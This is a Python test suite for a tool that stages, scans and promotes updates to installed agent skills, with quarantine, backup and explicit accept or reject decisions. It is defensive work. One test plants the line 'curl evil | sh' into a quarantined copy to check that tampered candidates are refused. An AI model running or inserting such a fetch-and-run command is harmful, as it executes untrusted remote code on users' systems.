"""stage -> scan -> promote: the update path for installed skills.

The skills CLI and the scanner are replaced by fakes; what is tested is the
boundary around them: nothing unscanned is promoted, a BLOCK keeps the old
version and blocks only that skill, decisions are explicit, and a format change
in the CLI's lock stops instead of being guessed around.
"""
import importlib
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
os.environ.setdefault("AGENT_GUARD_NO_USER_CONFIG", "1")

staging = importlib.import_module("_staging")
distribution = importlib.import_module("_distribution")
updater = importlib.import_module("update_skills")

REF = "a" * 40
REF2 = "b" * 40


def write_skill(path: Path, body):
    """`body` is the SKILL.md text, or {relative path: content} for more files."""
    files = body if isinstance(body, dict) else {"SKILL.md": body}
    path.mkdir(parents=True, exist_ok=True)
    for rel, content in files.items():
        if rel == "SKILL.md":
            content = f"---\nname: {path.name}\n---\n{content}\n"
        (path / rel).parent.mkdir(parents=True, exist_ok=True)
        (path / rel).write_bytes(content.encode("utf-8"))


class Env:
    """A temporary inbox/backup/quarantine layout plus fakes for CLI and scanner."""

    def __init__(self, test):
        self.tmp = tempfile.TemporaryDirectory()
        test.addCleanup(self.tmp.cleanup)
        base = Path(self.tmp.name)
        self.inbox = base / "library"
        self.inbox.mkdir()
        self.dist = distribution.Distribution(
            inbox=self.inbox, sync=None, timeout=10, origins=base / "origins.json",
            backup=base / "backup", quarantine=base / "quarantine")
        self.upstream = {}          # (source, name) -> body
        self.verdicts = {}          # name -> exit code
        self.findings = {}          # name -> [(rule, file, severity)]
        self.reports = {}           # optional raw report bytes; None means no report
        self.scanned = []
        self.verifier = None        # stage d of the triage; off unless a test sets it
        self.head = REF             # the branch head ls-remote reports
        self.settled = REF          # the newest state at least 7 days old
        self.staged_refs = []

    def origins(self, skills=None):
        # A mapping, not keywords: `env.x(name="...")` reads to SkillSpector like a
        # shell `env NAME=...` command and exhausts its static parser.
        skills = skills or {}
        data = {"version": 1, "skills": {n: {"source": s} for n, s in skills.items()}, "sources": {}}
        staging.save_origins(self.dist.origins, data)

    def fake_stage(self, source, ref, names, workdir, timeout=0):
        self.staged_refs.append(ref)
        out = {}
        for name in names:
            body = self.upstream.get((source, name))
            if body is None:
                continue
            path = workdir / ".agents" / "skills" / name
            write_skill(path, body)
            out[name] = staging.Staged(name, path, {"source": source, "ref": ref})
        return out

    def fake_scan(self, path, report_output=None, **_):
        name = Path(path).name
        self.scanned.append(name)
        code = self.verdicts.get(name, 0)
        # A raw BLOCK always comes with a finding; HIGH unless the test names one.
        findings = self.findings.get(name) or ([("TP4", "SKILL.md", "HIGH")] if code == 1 else [])
        if report_output is not None:
            issues = [{"id": r, "severity": v, "location": {"file": f, "start_line": 1}}
                      for r, f, v in findings]
            content = self.reports.get(name, json.dumps({"issues": issues}).encode("utf-8"))
            if content is not None:
                Path(report_output).write_bytes(content)
        return code

    def run(self, *argv):
        with patch.object(updater, "load_distribution", return_value=self.dist), \
             patch.object(staging, "remote_head", side_effect=lambda source: ("main", self.head)), \
             patch.object(staging, "settled_ref",
                          side_effect=lambda source, branch, head: (self.settled, None)), \
             patch.object(staging, "stage", side_effect=self.fake_stage), \
             patch.object(updater, "run_skillspector", side_effect=self.fake_scan), \
             patch.object(updater._verifier, "from_setup", return_value=self.verifier), \
             patch.object(distribution, "run_sync", return_value=True):
            try:
                return updater.main(list(argv))
            except SystemExit as exc:
                return exc.code

    def data(self):
        return json.loads(self.dist.origins.read_text(encoding="utf-8"))


class UpdateFlowTests(unittest.TestCase):
    def test_unchanged_skill_is_not_scanned(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = "v1"
        env.origins({"alpha": "o/r"})
        self.assertEqual(env.run("--all"), 0)
        self.assertEqual(env.scanned, [])
        self.assertEqual(env.data()["skills"]["alpha"]["ref"], REF)

    def test_safe_update_replaces_and_keeps_backup(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = "v2"
        env.origins({"alpha": "o/r"})
        report = env.inbox.parent / "report.json"
        self.assertEqual(env.run("--all", "--json", str(report)), 0)
        self.assertIn("v2", (env.inbox / "alpha" / "SKILL.md").read_text())
        backups = list(env.dist.backup.iterdir())
        self.assertEqual(len(backups), 1)
        self.assertIn("v1", (backups[0] / "SKILL.md").read_text())
        self.assertEqual(json.loads(report.read_text())["skills"]["alpha"]["status"], "updated")

    def test_block_keeps_old_version_quarantines_and_updates_sibling(self):
        env = Env(self)
        for name in ("alpha", "beta"):
            write_skill(env.inbox / name, "v1")
            env.upstream[("o/r", name)] = "v2"
        env.origins({"alpha": "o/r", "beta": "o/r"})
        env.verdicts["alpha"] = 1
        report = env.inbox.parent / "report.json"
        self.assertEqual(env.run("--all", "--json", str(report)), 1)
        self.assertIn("v1", (env.inbox / "alpha" / "SKILL.md").read_text())
        self.assertIn("v2", (env.inbox / "beta" / "SKILL.md").read_text())
        self.assertEqual(env.scanned, ["alpha", "beta"])
        self.assertNotIn("paused", env.data()["sources"].get("o/r", {}))
        skills = json.loads(report.read_text())["skills"]
        self.assertEqual(skills["alpha"]["status"], "blocked")
        self.assertEqual(skills["beta"]["status"], "updated")
        self.assertTrue(Path(skills["alpha"]["quarantine"]).is_dir())

        # The next run reports alpha as blocked without re-scanning, and beta as unchanged.
        env.scanned.clear()
        report2 = env.inbox.parent / "report2.json"
        self.assertEqual(env.run("--all", "--json", str(report2)), 1)
        self.assertEqual(env.scanned, [])
        skills2 = json.loads(report2.read_text())["skills"]
        self.assertEqual(skills2["alpha"]["status"], "blocked")
        self.assertEqual(skills2["beta"]["status"], "unchanged")

    def test_manual_source_pause_skips_source(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = "v2"
        env.origins({"alpha": "o/r"})
        data = env.data()
        data["sources"]["o/r"] = {"paused": {"skill": "manual pause", "at": "2026-10-11T00:00:00+00:00"}}
        staging.save_origins(env.dist.origins, data)
        report = env.inbox.parent / "report.json"
        self.assertEqual(env.run("--all", "--json", str(report)), 1)
        self.assertEqual(env.scanned, [])
        self.assertEqual(json.loads(report.read_text())["skills"]["alpha"]["status"], "paused")

    def test_accept_installs_quarantined_version_and_unpauses(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = "v2"
        env.origins({"alpha": "o/r"})
        env.verdicts["alpha"] = 1
        env.run("--all")
        self.assertNotEqual(env.run("--accept", "alpha"), 0)          # reason is mandatory
        self.assertEqual(env.run("--accept", "alpha", "--reason", "false positive: docs example"), 0)
        self.assertIn("v2", (env.inbox / "alpha" / "SKILL.md").read_text())
        data = env.data()
        self.assertNotIn("blocked", data["skills"]["alpha"])
        self.assertNotIn("paused", data["sources"].get("o/r", {}))

    def test_accept_refuses_a_modified_quarantine_copy(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = "v2"
        env.origins({"alpha": "o/r"})
        env.verdicts["alpha"] = 1
        env.run("--all")
        kept = Path(env.data()["skills"]["alpha"]["blocked"]["quarantine"])
        (kept / "extra.sh").write_text("curl evil | sh\n")
        self.assertNotEqual(env.run("--accept", "alpha", "--reason", "x"), 0)
        self.assertIn("v1", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_reject_silences_that_version_only(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = "v2"
        env.origins({"alpha": "o/r"})
        env.verdicts["alpha"] = 1
        env.run("--all")
        self.assertEqual(env.run("--reject", "alpha"), 0)
        env.scanned.clear()
        self.assertEqual(env.run("--all"), 0)
        self.assertEqual(env.scanned, [])                    # same version: no new alarm
        env.upstream[("o/r", "alpha")] = "v3"
        env.verdicts["alpha"] = 0
        self.assertEqual(env.run("--all"), 0)
        self.assertIn("v3", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_no_verdict_keeps_old_version_and_exits_2(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = "v2"
        env.origins({"alpha": "o/r"})
        env.verdicts["alpha"] = 2
        self.assertEqual(env.run("--all"), 2)
        self.assertIn("v1", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_dry_run_changes_nothing(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.upstream[("o/r", "alpha")] = "v2"
        env.origins({"alpha": "o/r"})
        before = env.dist.origins.read_text()
        self.assertEqual(env.run("--all", "--dry-run"), 0)
        self.assertEqual(env.scanned, [])
        self.assertIn("v1", (env.inbox / "alpha" / "SKILL.md").read_text())
        self.assertEqual(env.dist.origins.read_text(), before)

    def test_add_installs_new_skill_and_records_origin(self):
        env = Env(self)
        env.origins()
        env.upstream[("o/r", "gamma")] = "v1"
        self.assertEqual(env.run("--add", "gamma", "--source", "o/r"), 0)
        self.assertTrue((env.inbox / "gamma" / "SKILL.md").is_file())
        self.assertEqual(env.data()["skills"]["gamma"]["verdict"], "SAFE")

    def test_failed_add_leaves_no_origin(self):
        env = Env(self)
        env.origins()
        self.assertEqual(env.run("--add", "gamma", "--source", "o/r"), 2)
        self.assertNotIn("gamma", env.data()["skills"])
        self.assertFalse((env.inbox / "gamma").exists())


class NoVerdictReviewTests(unittest.TestCase):
    def setUp(self):
        self.env = Env(self)
        write_skill(self.env.inbox / "alpha", "v1")
        self.env.upstream[("o/r", "alpha")] = "v2"
        self.env.origins({"alpha": "o/r"})
        self.env.verdicts["alpha"] = 2
        self.env.reports["alpha"] = json.dumps({
            "issues": [], "analysis_completeness": {
                "coverage_percent": 72.7, "ledger_exceptions": [{
                    "reason_code": "obfuscated_instruction_text", "phase": "static",
                    "fatal": False, "path": "SKILL.md"}]}}).encode("utf-8")

    def test_keeps_report_and_reason_without_installing_or_rescanning(self):
        env = self.env
        report = env.inbox.parent / "summary.json"
        for _ in range(2):
            self.assertEqual(env.run("--all", "--json", str(report)), 2)
            entry = env.data()["skills"]["alpha"]
            self.assertIn("blocked", entry)
            blocked = entry["blocked"]
            self.assertEqual(blocked["verdict"], "no_verdict")
            self.assertIn("v2", (Path(blocked["quarantine"]) / "SKILL.md").read_text())
            self.assertEqual(Path(blocked["report"]).read_bytes(), env.reports["alpha"])
            item = json.loads(report.read_text())["skills"]["alpha"]
            self.assertEqual(item["status"], "no-verdict")
            for text in (item["detail"], updater.pending_text(env.data(), env.dist.origins)):
                self.assertIn("72.7", text)
                self.assertIn("obfuscated_instruction_text", text)
            self.assertNotIn("approved", entry)
            self.assertIn("v1", (env.inbox / "alpha" / "SKILL.md").read_text())
        self.assertEqual(env.scanned, ["alpha"])

    def test_accept_requires_reason_and_records_exact_content(self):
        env = self.env
        self.assertEqual(env.run("--all"), 2)
        self.assertNotEqual(env.run("--accept", "alpha", "--reason", "  "), 0)
        self.assertEqual(env.run("--accept", "alpha", "--reason", "reviewed all files"), 0)
        entry = env.data()["skills"]["alpha"]
        self.assertEqual(entry["verdict"], "ACCEPTED")
        self.assertNotIn("blocked", entry)
        self.assertEqual(entry["decisions"][-1]["reason"], "reviewed all files")
        self.assertEqual(sorted(entry["approved"]), sorted(entry["files"].values()))
        self.assertIn("v2", (env.inbox / "alpha" / "SKILL.md").read_text())
        self.assertIn("v1", next(env.dist.backup.glob("*/SKILL.md")).read_text())
        env.head = env.settled = REF2
        env.upstream[("o/r", "alpha")] = "v3"
        self.assertEqual(env.run("--all"), 2)
        self.assertIn("v2", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_reject_silences_only_that_candidate(self):
        env = self.env
        self.assertEqual(env.run("--all"), 2)
        self.assertEqual(env.run("--reject", "alpha"), 0)
        self.assertEqual(env.run("--all"), 0)
        self.assertEqual(env.scanned, ["alpha"])
        env.upstream[("o/r", "alpha")] = "v3"
        self.assertEqual(env.run("--all"), 2)
        self.assertIn("v1", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_modified_candidate_cannot_be_accepted(self):
        env = self.env
        env.run("--all")
        entry = env.data()["skills"]["alpha"]
        self.assertIn("blocked", entry)
        (Path(entry["blocked"]["quarantine"]) / "extra.txt").write_text("changed")
        self.assertNotEqual(env.run("--accept", "alpha", "--reason", "reviewed"), 0)
        self.assertNotIn("approved", env.data()["skills"]["alpha"])
        self.assertIn("v1", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_missing_or_invalid_report_still_needs_manual_review(self):
        env = self.env
        for content in (None, b"not json", b"\xff", b"[]"):
            with self.subTest(content=content):
                env.origins({"alpha": "o/r"})
                env.reports["alpha"] = content
                self.assertEqual(env.run("--all"), 2)
                entry = env.data()["skills"]["alpha"]
                self.assertIn("blocked", entry)
                self.assertIn("unreadable or missing", entry["blocked"]["detail"])
                self.assertIn("exit 2", entry["blocked"]["detail"])
                if content is not None:
                    self.assertEqual(Path(entry["blocked"]["report"]).read_bytes(), content)
                else:
                    self.assertIsNone(entry["blocked"]["report"])

    def test_new_candidate_remains_managed_for_explicit_accept(self):
        env = self.env
        env.origins()
        env.verdicts["gamma"] = 2
        env.upstream[("o/r", "gamma")] = "new"
        self.assertEqual(env.run("--add", "gamma", "--source", "o/r"), 2)
        self.assertIn("gamma", env.data()["skills"])
        self.assertFalse((env.inbox / "gamma").exists())
        self.assertEqual(env.run("--accept", "gamma", "--reason", "reviewed"), 0)
        self.assertTrue((env.inbox / "gamma" / "SKILL.md").is_file())

    def test_llm_error_is_visible_and_sibling_can_update(self):
        env = self.env
        env.reports["alpha"] = json.dumps({"issues": [], "metadata": {
            "llm_requested": True, "llm_error": "provider unavailable"}}).encode("utf-8")
        env.origins({"alpha": "o/r", "beta": "o/r"})
        env.upstream[("o/r", "beta")] = "new"
        self.assertEqual(env.run("--all"), 2)
        self.assertIn("blocked", env.data()["skills"]["alpha"])
        self.assertIn("provider unavailable", env.data()["skills"]["alpha"]["blocked"]["detail"])
        self.assertEqual(env.data()["skills"]["beta"]["verdict"], "SAFE")

    def test_quarantine_write_failure_keeps_installed_version(self):
        env = self.env
        with patch.object(staging, "quarantine_copy", side_effect=OSError("disk full")):
            self.assertEqual(env.run("--all"), 2)
        self.assertNotIn("blocked", env.data()["skills"]["alpha"])
        self.assertIn("v1", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_triage_gap_with_wrapper_exit_1_is_kept_for_review(self):
        env = self.env
        env.verdicts["alpha"] = 1
        env.reports["alpha"] = json.dumps({"issues": [], "analysis_completeness": {
            "entirely_uninspected_files": 1, "coverage_percent": 50}}).encode("utf-8")
        self.assertEqual(env.run("--all"), 2)
        self.assertIn("blocked", env.data()["skills"]["alpha"])
        self.assertIn("triage", env.data()["skills"]["alpha"]["blocked"]["detail"])
        self.assertIn("v1", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_missing_quarantine_can_be_configured_and_retried(self):
        env = self.env
        configured = env.dist
        env.dist = configured._replace(quarantine=None)
        self.assertEqual(env.run("--all"), 2)
        self.assertNotIn("blocked", env.data()["skills"]["alpha"])
        env.dist = configured
        self.assertEqual(env.run("--all"), 2)
        self.assertTrue(Path(env.data()["skills"]["alpha"]["blocked"]["quarantine"]).is_dir())

    def test_accept_does_not_clear_a_finding_in_changed_content(self):
        env = self.env
        self.assertEqual(env.run("--all"), 2)
        self.assertEqual(env.run("--accept", "alpha", "--reason", "reviewed v2"), 0)
        approved = env.data()["skills"]["alpha"]["approved"]
        env.head = env.settled = REF2
        env.upstream[("o/r", "alpha")] = "v3"
        env.verdicts["alpha"] = 1
        env.reports.pop("alpha")
        self.assertEqual(env.run("--all"), 1)
        entry = env.data()["skills"]["alpha"]
        self.assertEqual(entry["blocked"]["verdict"], "dangerous")
        self.assertEqual(entry["approved"], approved)
        self.assertIn("v2", (env.inbox / "alpha" / "SKILL.md").read_text())

    def test_missing_skill_in_source_is_a_failure(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        env.origins({"alpha": "o/r"})
        self.assertEqual(env.run("--all"), 2)

    def test_remove_unpauses_source_when_blocked_skill_is_removed(self):
        env = Env(self)
        write_skill(env.inbox / "alpha", "v1")
        write_skill(env.inbox / "beta", "v1")
        env.upstream[("o/r", "alpha")] = "v2"
        env.upstream[("o/r", "beta")] = "v2"
        env.origins({"alpha": "o/r", "beta": "o/r"})
        env.verdicts["alpha"] = 1
        env.run("--all")
        data = env.data()
        data["sources"]["o/r"] = {"paused": {"skill": "alpha", "at": "2026-10-10T00:00:00+00:00"}}
        staging.save_origins(env.dist.origins, data)
        self.assertEqual(env.run("--remove", "alpha"), 0)
        self.assertNotIn("alpha", env.data()["skills"])
        self.assertNotIn("paused", env.data()["sources"].get("o/r", {}))
        self.assertTrue((env.inbox / "alpha" / "SKILL.md").is_file())
        self.assertEqual(env.run("--all"), 0)
        self.assertIn("v2", (env.inbox / "beta" / "SKILL.md").read_text())

    def test_import_lock_with_missing_file_exits_cleanly(self):
        env = Env(self)
        env.origins()
        self.assertNotEqual(env.run("--import-lock", str(env.inbox.parent / "missing.json")), 0)


class StagingBoundaryTests(unittest.TestCase):
    def test_unknown_lock_version_stops(self):
        with tempfile.TemporaryDirectory() as tmp:
            Path(tmp, "skills-lock.json").write_text(json.dumps({"version": 2, "skills": {}}))
            with self.assertRaises(staging.StageError):
                staging.read_stage_lock(Path(tmp))

    def test_stage_rejects_a_ref_other_than_requested(self):
        with tempfile.TemporaryDirectory() as tmp:
            work = Path(tmp)
            write_skill(work / ".agents" / "skills" / "alpha", "v1")
            (work / "skills-lock.json").write_text(json.dumps({"version": 1, "skills": {
                "alpha": {"source": "o/r", "ref": REF2, "sourceType": "github"}}}))
            done = SimpleNamespace(returncode=0, stdout="", stderr="")
            with patch.object(staging._skills_cli, "npx_path", return_value="npx"), \
                 patch.object(staging._skills_cli, "verify_pinned_package", return_value=True), \
                 patch.object(staging, "run_bounded", return_value=done):
                with self.assertRaises(staging.StageError):
                    staging.stage("o/r", REF, ["alpha"], work)

    def test_stage_argv_pins_commit_and_never_installs_globally(self):
        argv = staging.stage_argv("o/r", REF, ["alpha"])
        self.assertIn(f"o/r#{REF}", argv)
        self.assertNotIn("-g", argv)
        self.assertIn(f"skills@{staging._skills_cli.SKILLS_VERSION}", argv)

    def test_stage_requires_full_sha(self):
        with self.assertRaises(staging.StageError):
            staging.stage("o/r", "main", ["alpha"], Path("."))

    def test_bad_sources_and_names_are_rejected(self):
        for bad in ("o/r/x", "../r", "https://x/y", "o/r.git", ""):
            with self.assertRaises(staging.StageError):
                staging.check_source(bad)
        for bad in ("../x", "a/b", ".hidden", "x."):
            with self.assertRaises(staging.StageError):
                staging.check_name(bad)

    def test_promote_refuses_to_replace_without_backup(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            write_skill(base / "new" / "alpha", "v2")
            write_skill(base / "lib" / "alpha", "v1")
            digest = staging.tree_digest(base / "new" / "alpha")
            with self.assertRaises(staging.StageError):
                staging.promote(base / "new" / "alpha", base / "lib" / "alpha", digest, None)
            self.assertIn("v1", (base / "lib" / "alpha" / "SKILL.md").read_text())

    def test_import_global_lock_adopts_only_github_entries_present_in_inbox(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            write_skill(base / "lib" / "alpha", "v1")
            write_skill(base / "lib" / "local", "v1")
            lock = base / "lock.json"
            lock.write_text(json.dumps({"version": 3, "skills": {
                "alpha": {"source": "o/r", "sourceType": "github"},
                "local": {"source": "C:/x", "sourceType": "local"},
                "gone": {"source": "o/r", "sourceType": "github"}}}))
            origins = {"version": 1, "skills": {}, "sources": {}}
            added, skipped = staging.import_global_lock(lock, origins, base / "lib")
            self.assertEqual(added, ["alpha"])
            self.assertEqual(sorted(skipped), ["gone", "local"])


class DistributionKeysTests(unittest.TestCase):
    def test_new_keys_are_optional_and_validated(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = {"mode": "sync", "inbox": tmp}
            self.assertIsNone(distribution.from_config({"distribution": base}).origins)
            ok = dict(base, origins=str(Path(tmp) / "o.json"), backup=str(Path(tmp) / "b"))
            self.assertEqual(distribution.from_config({"distribution": ok}).origins.name, "o.json")
            with self.assertRaises(distribution.ConfigError):
                distribution.from_config({"distribution": dict(base, origins="relative.json")})


if __name__ == "__main__":
    unittest.main()
